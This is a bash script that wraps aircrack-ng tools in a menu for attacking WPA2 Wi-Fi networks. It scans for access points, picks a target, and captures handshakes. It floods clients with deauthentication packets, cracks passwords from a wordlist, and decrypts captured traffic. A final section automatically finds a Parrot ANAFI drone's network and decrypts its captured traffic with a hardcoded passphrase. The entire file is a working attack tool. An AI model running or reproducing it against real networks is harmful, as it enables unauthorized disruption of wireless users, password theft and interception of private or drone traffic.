#!/bin/bash
FILE1="find_ap" #result of find ap
FILE2="result" #parsing of find ap - mac, channel, SSID
FILE3="list" #dictonary file
FILE4="" #target file - crack
MY_Target=""
MY_SSID=""
MY_ch=""
MY_TIME=10
MY_NAME="temp"
Deauth_num=100

while :
do
echo ----------------------
echo 0. Find AP          
echo 1. targetting\(list AP\)
echo 2. set timeout      
echo 3. set filename     
echo 4. start sniff      
echo 5. deauth
echo 6. crack password 
echo 7. decap 
echo 8. clean
echo 9. set-monitor-mod
echo 10. set-managed-mod     
echo 11. end      
echo ----------------------
	read NUM

	case $NUM in
		0)
			num=0
			ch=0
			echo Start to find AP
				timeout 5 airodump-ng wlp45s0 > $FILE1
				cat $FILE1 | grep WPA2 | sort | uniq -w 10 | sed '/\[1B/d' | awk '{ printf"%s %s",$1,$6;for(i=11;i<NF;i++) printf" %s ",$i; printf"\n";}' > $FILE2
				line=$(cat $FILE2) | wc -l
				echo ----------------------
				echo Find AP number = $line
				echo ----------------------
				continue
			;;
		1)
			if [ ! -e $FILE2 ];then
				echo No search AP FILE 
				echo Please execute Number 0 first - \(Find AP\)
				continue

			fi
			echo ----------------------
			echo AP List 
			echo ----------------------
			line=$(cat $FILE2 | wc -l)
			line_num=0
			cat $FILE2 | awk '{printf"%s ",NR;for(i=3;i<=NF;i++) printf" %s",$i;printf"\n";}'
			echo Select Target AP Number
			read AP
			if [ $AP -gt $line -o $AP -le 0 ];then
				echo Wrong Input
				continue
			fi

		#	cat result | head -$AP | tail -1	
			MY_Target=$(cat $FILE2 | head -$AP | tail -1 | awk '{for(i=3;i<=NF;i++) printf" %s",$i}')
			MY_SSID=$(cat $FILE2 | head -$AP | tail -1 | awk '{printf"%s",$1}')	
			MY_ch=$(cat $FILE2 | head -$AP | tail -1 | awk '{printf"%s",$2}')

			echo ----------------------
			echo MY_target = $MY_Target	
			echo My_target ssid = $MY_SSID
			echo My_target ch = $MY_ch
			echo ----------------------
			;;
		2)
			echo ----------------------
			echo Input Time\(sec\)\(This time is snipping time\)
			echo ----------------------
			read time
			if [ $time -le 0 ];then
				echo Wrong Input
				continue
			fi
			MY_TIME=$time
			echo ----------------------
			echo Snipping TIme = $MY_TIME
			echo ----------------------
			
			;;
		3)
			echo ----------------------
			echo Input Output FileNmae\(FileName, FileName-dec\)
			echo ----------------------
			read name
			MY_NAME=$name
			echo FileName = $name
			;;
		4)
			if [ -z "$MY_Target" -o -z "$MY_SSID" -o -z "$MY_ch" ]; then
				echo Set Target - pick number 1
				continue
			fi
			if [ -z "$MY_TIME" ]; then
				echo Input TIME - pick number 2
				continue
			fi
			
			if [ -z "$MY_NAME" ]; then
				echo Input File Name - pick number 3
				continue
			fi
			timeout $MY_TIME airodump-ng --bssid $MY_SSID -c $MY_ch -w wpa wlp45s0 > /dev/null	
			mv wpa-01.cap $MY_NAME
			rm -rf wpa*
			echo ----------------------
			echo Sniffing Complete - Filename = $MY_NAME
			echo ---------------------
			;;
		5)
			if [ -z "$MY_Target" -o -z "$MY_SSID" -o -z "$MY_ch" ]; then
				echo Set Target - pick number 1
				continue
			fi
			echo ----------------------
			echo Input Number of Deauth Packet - default : 100
			echo ----------------------
			read time
		       	Deauth_num=$time	
			if [ $time -le 0 ];then
				echo Wrong Input
				continue
			fi
			iwconfig wlp45s0 channel $MY_ch
			aireplay-ng --deauth $Deauth_num -a $MY_SSID wlp45s0
			echo ----------------------
			echo deauth Complete 
			echo ----------------------
			continue
			;;
		6)
			echo ----------------------
			echo Input list name - default = list 
			echo ----------------------
			read list
			FILE3=$list
			echo ----------------------
			echo Input target file 
			echo ----------------------
			ls -la
			read file
			FILE4=$file
			aircrack-ng -w $FILE3 $FILE4
			echo ----------------------
			echo crack complete 
			echo ----------------------
			continue	
			;;
			
		7)# Crack Password
			echo ----------------------
			echo Input crack password 
			echo ----------------------
			read password
			echo ----------------------
			echo Input target file
			echo ----------------------
			read file
			FILE4=$file
			PASS=$password
			airdecap-ng -l -p $PASS -e $MY_Target $FILE4
			;;
		8);;
		9)# Set Monitor Mode
			echo ----------------------
			echo Set Monitor Mode
			ifconfig wlp45s0 down
			iwconfig wlp45s0 mode monitor
			rfkill unblock 1
			rfkill unblock 0
			ifconfig wlp45s0 up
			echo Complete
			echo ----------------------
			;;
		10)# Set Managed Mode
			echo ----------------------
			echo Set Manage Mode
			ifconfig wlp45s0 down
			iwconfig wlp45s0 mode managed
			ifconfig wlp45s0 up
			echo Complete
			echo ----------------------
			;;
		11)
			rm -rf $FILE1
			rm -rf $FILE2
			echo Bye
			return 0;;
	esac
done

if [ -z "$1" ]; then
	echo Input timeout
	return 0
fi

if [ -z "$2" ]; then
	echo Input file name 
	return 0
fi

rm -rf ./all_snf
num=0
ch=0
while :
do
	((num++))
	echo find num\(dead_line = 3\) = $num

	timeout 5 airodump-ng wlp45s0 > ./all_snf

	echo -e check target = $(cat ./all_snf | grep ANAFI | tail -1 | sed 's/^ *//')\\n
	
	ch=$(cat ./all_snf | grep ANAFI | tail -1 | sed 's/^ *//' | awk '{print $6}')
	ssid=$(cat ./all_snf | grep ANAFI | tail -1 | sed 's/^ *//' | awk '{print $1}')
	
	if [ $ch -gt 0 ]; then
		echo -e Find ANAFI drone\\n
		break
	fi

	if [ $num -gt 3 ]; then
		echo -e Can not find ANAFI drone\\n
		return 0
	fi
done

echo ch = $ch
echo ssid = $ssid
echo dump_time = $1 sec
echo -e dump_name = $2 \\n

timeout $1 airodump-ng --bssid $ssid -c $ch -w tmp wlp45s0 > /dev/null
mv tmp-01.cap $2
rm -rf tmp*

airdecap-ng -p RNK1SHJH5WRU -e ANAFI-L122636 $2 > /dev/null
echo ---------------------------
echo non_decry_file = $2
echo decry_file = $2-dec
echo ---------------------------

#'exit 100'
#'air_pid=$(airodump-ng wlp45s0 &)

#echo $air_pid
